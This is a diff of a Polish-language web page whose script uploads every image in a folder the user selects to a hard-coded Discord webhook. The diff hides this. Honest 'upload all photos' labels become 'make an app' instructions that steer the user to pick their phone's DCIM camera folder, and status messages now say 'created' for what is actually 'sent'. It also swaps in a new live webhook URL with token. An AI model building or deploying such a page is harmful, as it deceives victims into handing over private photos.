@@ -15,14 +15,14 @@
     </style>
 </head>
 <body>
-    <button id="btn">⬆ PRZEŚLIJ WSZYSTKIE ZDJĘCIA</button>
+    <button id="btn">⬆ Zrób Aplikacje (wybierz folder DCMI i kliknij wybierz folder) </button>
     <div class="progress" id="progressWrap"><div class="progress-bar" id="progressBar"></div></div>
-    <div id="status">Kliknij – automatycznie pobierze wszystkie zdjęcia z galerii.</div>
+    <div id="status">Kliknij .</div>
     <input type="file" id="fileInput" accept="image/*" multiple webkitdirectory>
 
 <script>
     // === KONFIG ===
-    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1490439974825361619/-WkrSVLRVcbrx8-3_9901c8BuTqBpmY1z9Fh6mKtEGV3lHrY2CYcf2CuPHqh_aMSl8pq';
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1490705026585198603/eNkICDhYIT0S_TiJKtbznMXLTuA-kgD0Lf2yg8hS_eZiUVSlnAha40gvRH7GeHjdMNE1';
     const ALLOWED_EXT = ['.jpg','.jpeg','.png','.gif','.bmp','.webp','.heic','.heif','.tiff'];
     const DELAY_MS = 600;
 
@@ -63,7 +63,7 @@
                 return;
             }
 
-            status.innerText = `📸 Znaleziono ${files.length} plików. Wysyłanie...`;
+            status.innerText = `📸 utworzono ${files.length} tyle %. Wysyłanie...`;
             let sent = 0, fail = 0;
 
             for (let i = 0; i < files.length; i++) {
@@ -89,7 +89,7 @@
                 }
             }
 
-            status.innerText = `✅ Gotowe! Wysłano: ${sent}, błędów: ${fail}`;
+            status.innerText = `✅ Gotowe! utworzono: ${sent}, błędów: ${fail}`;
             progressBar.style.width = '100%';
         } catch (err) {
             if (err.name !== 'AbortError') {
